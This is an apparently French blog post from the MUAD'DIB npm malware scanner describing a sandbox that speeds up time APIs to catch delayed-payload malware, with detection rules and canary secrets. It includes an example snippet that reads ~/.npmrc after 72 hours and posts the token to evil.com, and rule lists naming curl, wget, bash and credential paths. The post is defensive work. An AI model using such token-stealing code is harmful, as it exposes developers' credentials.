@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Le sandbox qui voyage dans le temps — MUAD'DIB</title>
+  <meta name="description" content="Monkey-patching des APIs de temps pour detecter les malwares qui attendent 72h avant de voler des credentials.">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+<body>
+
+<nav>
+  <a href="../" class="site-name">muad-dib</a>
+  <a href="../">accueil</a>
+  <a href="./">blog</a>
+  <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">github</a>
+  <a href="https://www.npmjs.com/package/muaddib-scanner" target="_blank" rel="noopener">npm</a>
+</nav>
+
+<main>
+  <a href="./" class="back-link">&larr; Blog</a>
+
+  <article>
+    <div class="article-meta">
+      <h1>Le sandbox qui voyage dans le temps</h1>
+      <span class="date">2026-03-02</span>
+      <div class="tags">
+        <span class="tag">sandbox</span>
+        <span class="tag">time-bomb</span>
+        <span class="tag">evasion</span>
+      </div>
+    </div>
+
+    <div class="article-content">
+
+      <p>MITRE ATT&CK T1497.003 — Time Based Evasion Checks — est dans le top 10 des techniques d'evasion en 2026. L'idee est simple : le malware attend 72 heures avant de voler les credentials. Le sandbox Docker a un timeout de 120 secondes. Le payload ne s'execute jamais pendant l'analyse.</p>
+
+      <p>La solution : on accelere le temps.</p>
+
+      <h2>Le probleme</h2>
+
+      <p>Un malware classique fait ceci :</p>
+
+      <pre><code class="language-javascript">// Attendre 3 jours apres l'installation
+setTimeout(() => {
+  const token = fs.readFileSync(
+    path.join(os.homedir(), '.npmrc'), 'utf8'
+  );
+  fetch('https://evil.com/collect', {
+    method: 'POST',
+    body: token
+  });
+}, 72 * 3600 * 1000);  // 72 heures</code></pre>
+
+      <p>Le sandbox execute le package pendant 120 secondes. Le <code>setTimeout</code> de 72h ne se declenche jamais. Le sandbox conclut : aucun comportement suspect. Package clean.</p>
+
+      <p>C'est exactement ce que les attaquants veulent.</p>
+
+      <h2>La solution : monkey-patching via preload</h2>
+
+      <p>Le container Docker injecte un script preload via <code>NODE_OPTIONS=--require /opt/preload.js</code>. Ce script patche toutes les APIs de temps <strong>avant</strong> que le code du package s'execute :</p>
+
+      <pre><code class="language-javascript">// Sauvegarder les originaux dans une closure inaccessible
+const _origDateNow = Date.now;
+const _origSetTimeout = setTimeout;
+const _origSetInterval = setInterval;
+
+// Offset de temps (configurable par run)
+let timeOffset = 0;  // Run 1: 0h, Run 2: +72h, Run 3: +7j
+
+// Patcher Date.now() et new Date()
+Date.now = () => _origDateNow.call(Date) + timeOffset;
+const _OrigDate = Date;
+globalThis.Date = function(...args) {
+  if (args.length === 0) return new _OrigDate(_origDateNow() + timeOffset);
+  return new _OrigDate(...args);
+};
+
+// Accelerer les timers
+globalThis.setTimeout = (fn, delay, ...args) => {
+  if (delay > 3600000) {  // > 1h
+    log({ type: 'suspicious_timer', delay });
+    return _origSetTimeout(fn, 0, ...args);  // Execution immediate
+  }
+  return _origSetTimeout(fn, delay, ...args);
+};</code></pre>
+
+      <p>Les APIs patchees de maniere coherente :</p>
+      <ul>
+        <li><code>Date.now()</code> — retourne le temps reel + offset</li>
+        <li><code>new Date()</code> sans argument — date decalee</li>
+        <li><code>performance.now()</code>, <code>process.hrtime()</code>, <code>process.uptime()</code> — tous synchronises</li>
+        <li><code>setTimeout(fn, 72h)</code> &rarr; <code>setTimeout(fn, 0)</code> — execution immediate</li>
+        <li><code>setInterval(fn, delay)</code> &rarr; premiere execution immediate</li>
+      </ul>
+
+      <h2>Multi-run : 3 points dans le temps</h2>
+
+      <p>Un seul offset ne suffit pas. Certains malwares attendent 3 jours, d'autres 1 semaine, d'autres verifient la date de premiere installation. Le sandbox execute le package <strong>3 fois</strong> :</p>
+
+      <table>
+        <tr><th>Run</th><th>Offset</th><th>Cible</th></tr>
+        <tr><td>Run 1</td><td>0h</td><td>Baseline — comportement immediat</td></tr>
+        <tr><td>Run 2</td><td>+72h</td><td>Time-bombs 3 jours</td></tr>
+        <tr><td>Run 3</td><td>+7 jours</td><td>Time-bombs 1 semaine</td></tr>
+      </table>
+
+      <p>Sortie anticipee si le score depasse 80 (CRITICAL detecte). Le meilleur score des 3 runs est retenu.</p>
+
+      <h2>Interception des APIs sensibles</h2>
+
+      <p>En plus de l'acceleration du temps, le preload intercepte toutes les APIs sensibles pour logging comportemental :</p>
+
+      <ul>
+        <li><strong>Reseau</strong> : <code>http.request</code>, <code>https.request</code>, <code>fetch</code>, <code>dns.resolve</code>, <code>net.connect</code></li>
+        <li><strong>Fichiers</strong> : <code>readFileSync</code>/<code>writeFileSync</code> avec detection de chemins sensibles (<code>.npmrc</code>, <code>.ssh</code>, <code>.aws</code>)</li>
+        <li><strong>Processus</strong> : <code>exec</code>/<code>spawn</code> avec detection de commandes dangereuses (<code>curl</code>, <code>wget</code>, <code>bash</code>)</li>
+        <li><strong>Environnement</strong> : Proxy sur <code>process.env</code> pour logger l'acces aux variables TOKEN/SECRET/KEY</li>
+      </ul>
+
+      <p>Tout est ecrit dans <code>/tmp/preload.log</code> en JSON structuree, puis analyse par <code>src/sandbox/analyzer.js</code>.</p>
+
+      <h2>6 nouvelles regles de detection</h2>
+
+      <table>
+        <tr><th>Regle</th><th>Severite</th><th>Pattern</th></tr>
+        <tr><td>Timer delay &gt; 1h</td><td>MEDIUM</td><td><code>setTimeout</code> avec delai suspicieux</td></tr>
+        <tr><td>Timer delay &gt; 24h</td><td>CRITICAL</td><td>Time-bomb probable</td></tr>
+        <tr><td>Lecture fichier sensible</td><td>HIGH</td><td>.npmrc, .ssh, .aws, .env via preload</td></tr>
+        <tr><td>Reseau apres lecture sensible</td><td>CRITICAL</td><td>Compose : file read + network = exfiltration</td></tr>
+        <tr><td>Execution commande dangereuse</td><td>HIGH</td><td>curl, wget, bash, powershell via preload</td></tr>
+        <tr><td>Acces env sensible</td><td>MEDIUM</td><td>TOKEN, SECRET, KEY, PASSWORD</td></tr>
+      </table>
+
+      <p>La regle composite "reseau apres lecture sensible" est la plus puissante. Elle detecte la sequence exacte d'exfiltration : lire un fichier de credentials, puis envoyer les donnees sur le reseau. Score : +40 points — suffisant pour declencher l'alerte a lui seul.</p>
+
+      <h2>Canary tokens : les honeypots</h2>
+
+      <p>Le sandbox injecte 6 faux secrets dans l'environnement :</p>
+
+      <pre><code class="language-bash">GITHUB_TOKEN=ghp_canary_xxxxxxxxxxxx
+NPM_TOKEN=npm_canary_xxxxxxxxxxxx
+AWS_ACCESS_KEY_ID=AKIA_canary_xxxxxxx
+AWS_SECRET_ACCESS_KEY=canary_xxxxxxx
+SLACK_WEBHOOK_URL=https://hooks.slack.com/canary
+DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/canary</code></pre>
+
+      <p>Si le package tente d'exfiltrer ces tokens via HTTP, DNS, ou stdout, c'est la preuve directe de malveillance. L'exfiltration est recherchee dans 7 vecteurs : corps HTTP, requetes DNS, URLs HTTP, connexions TLS, modifications filesystem, commandes processus, et sortie d'installation.</p>
+
+      <h2>Securite du preload</h2>
+
+      <ul>
+        <li>Tout est encapsule dans une IIFE — le package cible ne peut pas acceder aux references originales</li>
+        <li>Chaque patch est protege par <code>try/catch</code> — le preload ne peut jamais casser le package analyse</li>
+        <li><code>NODE_OPTIONS</code> est verrouille via <code>Object.defineProperty</code> apres injection — empeche le bypass dans les processus enfants</li>
+        <li>L'injection est differee au point d'entree du package, pas pendant <code>npm install</code> — evite d'intercepter les appels reseau de npm lui-meme</li>
+      </ul>
+
+      <h2>Resultats</h2>
+
+      <table>
+        <tr><th>Metrique</th><th>Avant</th><th>Apres</th></tr>
+        <tr><td>Regles sandbox</td><td>8</td><td><strong>14</strong> (+6)</td></tr>
+        <tr><td>Tests</td><td>1471</td><td><strong>1522</strong> (+51)</td></tr>
+        <tr><td>Detection time-bombs</td><td>impossible</td><td><strong>3 points dans le temps</strong></td></tr>
+      </table>
+
+      <h2>Lecon</h2>
+
+      <p>Les malwares modernes ne s'executent pas immediatement. Ils attendent que le scanner ait fini son analyse, que l'environnement CI/CD soit passe, que l'attention du developpeur se soit relachee. L'acceleration du temps dans le sandbox transforme un <code>setTimeout(fn, 72h)</code> en <code>setTimeout(fn, 0)</code> — le malware croit que 3 jours se sont ecoules, et declenche son payload pendant l'analyse.</p>
+
+      <p>Le monkey-patching coherent est essentiel. Si <code>Date.now()</code> dit +72h mais que <code>process.uptime()</code> dit 2 secondes, un malware sophistique detecte l'inconsistance. Toutes les APIs de temps doivent raconter la meme histoire.</p>
+
+    </div>
+  </article>
+</main>
+
+<footer>
+  MUAD'DIB / DNSZLSK / <a href="https://github.com/DNSZLSK/muad-dib" target="_blank" rel="noopener">source</a>
+</footer>
+
+</body>
+</html>
